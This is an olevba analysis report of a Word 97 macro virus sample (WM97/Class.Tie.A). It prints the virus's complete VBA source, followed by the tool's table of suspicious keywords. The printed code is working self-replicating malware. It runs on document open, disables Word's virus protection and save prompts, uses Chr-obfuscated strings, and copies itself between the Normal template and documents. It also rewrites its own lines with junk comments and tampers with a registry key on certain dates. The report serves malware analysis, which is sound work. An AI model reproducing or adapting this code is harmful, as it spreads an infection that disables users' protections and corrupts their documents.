olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bj-1130e1b8ec61f70acc492c51d70fc4ff478fdd61
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bj-1130e1b8ec61f70acc492c51d70fc4ff478fdd61 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo 73

Options.VirusProtection = Chr(48): x = 0: zz = 1: vf = 4: cx = 2

Options.SaveNormalPrompt = Chr(48)

Options.ConfirmConversions = Chr(48)

ties = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines

tier = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines

If tier > 74 And ties > Sgn(x) Then GoTo 73

If tier < 74 Then

 Set tvir = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))

 ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Name = tvir.Name

 ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(84) + Chr(73) + Chr(69) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

End If

If ties = Sgn(x) Then Set tvir = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))

 Infection = Int(Rnd * 100)

 If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

 If Month(Now()) > 6 And Day(Now()) = 15 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "Class Tie Document!"

 tvir.codemodule.AddFromFile Windows.Application.Path & Chr(84) + Chr(73) + Chr(69) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

 With tvir.codemodule

    For j = Abs(zz) To Abs(vf)

    .deletelines Abs(zz)

    Next j

 End With

 If tier < 74 Then

    With tvir.codemodule

    .replaceline Abs(zz), "Sub AutoClose()"

    .replaceline 79, "Sub ToolsMacro()"
       
    rd1 = Int(Rnd * 25)

 If rd1 = 24 Then .replaceline 67, ".replaceline j, Chr(39) & Application.ActivePrinter & Application.ActiveWindow"
    
End With

 End If

 With tvir.codemodule

    For j = Abs(cx) To 76 Step Abs(cx)

    .replaceline j, Chr(39) & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version

    Next j

 End With

73:

 If tier > 74 And ties = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

 End Sub

Sub ViewVBCode()

End Sub 'WM97/Class.Tie.A By Virus ;) Smile
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
